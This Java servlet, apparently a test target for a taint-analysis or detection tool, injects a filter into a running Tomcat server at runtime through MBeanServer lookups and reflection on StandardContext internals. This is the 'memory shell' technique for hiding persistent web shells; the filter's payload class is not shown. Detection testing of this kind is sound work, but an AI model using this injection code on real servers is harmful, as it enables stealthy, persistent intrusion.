package target.taint.FilterBasedWithoutRequestVariant;

import target.taint.FilterBasedWithoutRequestVariant.Util;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Set;

public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try {
            String filterName = "dynamic3";
            String urlPattern = "/ccc";

            // Get the MBeanServer from Tomcat's Registry
            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();

            // Query for the object with the required ObjectName pattern
            Set<ObjectName> objectSet = mbeanServer.queryNames(
                    new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);

            for (ObjectName objectName : objectSet) {
                try {
                    DynamicMBean dynamicMBean = (DynamicMBean) mbeanServer.invoke(objectName, "getMBeanInfo", null, null);

                    // Access the "resource" field of the BaseModelMBean class
                    Field field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean")
                            .getDeclaredField("resource");
                    field.setAccessible(true);
                    Object authenticatorBase = field.get(dynamicMBean);

                    // Access the "context" field of the AuthenticatorBase class
                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase")
                            .getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(authenticatorBase);

                    // Access the "filterConfigs" field of the StandardContext class
                    field = standardContext.getClass().getDeclaredField("filterConfigs");
                    field.setAccessible(true);
                    HashMap<String, ApplicationFilterConfig> map =
                            (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                    if (map.get(filterName) == null) {
                        System.out.println("[+] Adding Dynamic Filter");

                        // Create FilterDef instance using reflection
                        Class<?> filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                        Object filterDef = filterDefClass.getDeclaredConstructor().newInstance();

                        filterDefClass.getMethod("setFilterName", String.class).invoke(filterDef, filterName);
                        Class<?> filterClass = Util.getDynamicFilterTemplateClass();
                        filterDefClass.getMethod("setFilterClass", String.class).invoke(filterDef, filterClass.getName());
                        filterDefClass.getMethod("setFilter", Filter.class).invoke(filterDef, filterClass.getDeclaredConstructor().newInstance());

                        standardContext.getClass().getMethod("addFilterDef", filterDefClass).invoke(standardContext, filterDef);

                        // Set up FilterMap using reflection
                        Class<?> filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                        Object filterMap = filterMapClass.getDeclaredConstructor().newInstance();

                        filterMapClass.getMethod("setFilterName", String.class).invoke(filterMap, filterName);
                        filterMapClass.getMethod("setDispatcher", String.class).invoke(filterMap, DispatcherType.REQUEST.name());
                        filterMapClass.getMethod("addURLPattern", String.class).invoke(filterMap, urlPattern);
                        standardContext.getClass().getMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filterMap);

                        // Set up FilterConfig for the newly added filter
                        Constructor<?> constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
                        map.put(filterName, filterConfig);
                    }
                } catch (Exception e) {
                    // Log or handle individual exception as needed
                    e.printStackTrace();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
